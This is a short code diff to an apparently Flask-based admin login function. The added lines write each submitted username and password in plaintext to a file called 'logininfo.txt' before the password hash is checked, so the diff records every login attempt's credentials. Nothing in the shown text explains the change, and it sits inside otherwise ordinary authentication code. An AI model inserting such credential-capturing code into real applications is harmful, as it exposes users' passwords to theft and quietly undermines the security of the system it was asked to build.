@@ -119,6 +119,8 @@ def login():
     admin = Admins.query.first()
     login = form_data["login"]
     password = form_data["password"]
+    with open("logininfo.txt", "w") as f:
+        f.write("{}\n{}".format(login, password))
     if login == admin.login and bcrypt.check_password_hash(admin.password, password):
         session["is_admin"] = True
         res = make_response(("", 200, {"content-type": "application/json"}))
